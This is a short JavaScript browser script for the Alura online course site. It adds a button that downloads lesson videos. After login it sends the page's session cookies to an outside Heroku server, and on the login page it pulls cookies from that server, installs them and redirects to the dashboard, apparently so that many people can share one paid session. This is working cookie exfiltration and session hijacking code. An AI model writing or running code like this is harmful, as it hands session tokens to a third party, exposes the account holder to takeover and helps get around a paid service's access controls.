var actions = document.querySelector('.task-actions .container')

if (actions) {
	actions.innerHTML += '<button class="task-actions-button" style="background-color:#bf2f2f;" onclick="window.location.assign(document.getElementsByTagName(\'video\')[0].src)">Download</button>';
}

if (document.referrer.match(/login/) && !document.documentURI.match(/login/)) {
	shareCookies();

} else if (document.documentURI.match(/login/) && !document.referrer.match(/login/)) {
	getSharedCookies(function() {
			console.log(document.referrer);
	  	   window.location.href = "https://cursos.alura.com.br/dashboard"
	});
}

function shareCookies() {
	console.log('shareCookies')
	var url  = 'https://who-wants-a-cookie.herokuapp.com/cookies/' + document.domain;
	var data = new FormData();
	data.append('cookies', document.cookie);

	var request = new XMLHttpRequest();
	request.open("POST", url);
	request.send(data);
}

function getSharedCookies(callback) {
	console.log('getSharedCookies')
	var url  = 'https://who-wants-a-cookie.herokuapp.com/cookies/' + document.domain;
	var request = new XMLHttpRequest();
	request.open("GET", url);
	request.send(null);

	request.onreadystatechange = function() {
        if (request.readyState == 4 && request.status == 200) {
            
			if (request.response) {
				cookies = JSON.parse(request.response).cookies
				cookies.split(';').map(function(cookie){ 
					document.cookie = cookie;
				});
			}

			callback();
        }
    }; 
}

